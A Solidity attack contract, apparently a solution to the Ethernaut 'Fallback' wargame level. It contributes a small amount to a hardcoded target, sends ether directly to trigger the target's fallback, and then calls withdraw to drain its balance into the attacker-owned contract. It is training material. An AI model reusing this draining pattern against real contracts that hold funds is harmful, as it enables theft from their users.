// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract AttackFallback {
    address public constant ethernaunt = 0xd7dbCDF0Efc84fD1362C626d75Ea7de74703AF23;
    IExpose target;
    address owner;

    constructor() payable {
        target = IExpose(ethernaunt);
        owner = msg.sender;
    }

    function contribute() external payable {
        target.contribute{value: 0.0001 ether}();
    }

     function sendEth() external  payable{
        payable(address(target)).transfer(0.0001 ether);
    }

     function withdraw() external {
        target.withdraw();
    }

    // fallback() payable external{
    //     if(address(target).balance > 0){
    //         target.withdraw();
    //     }
    // }

    function get(address payable to) external {
        require(owner == msg.sender);
        to.transfer(address(this).balance);
    }
}


interface IExpose {
    function contribute() external payable;

    function getContribution() external view returns (uint);

    function withdraw() external;
}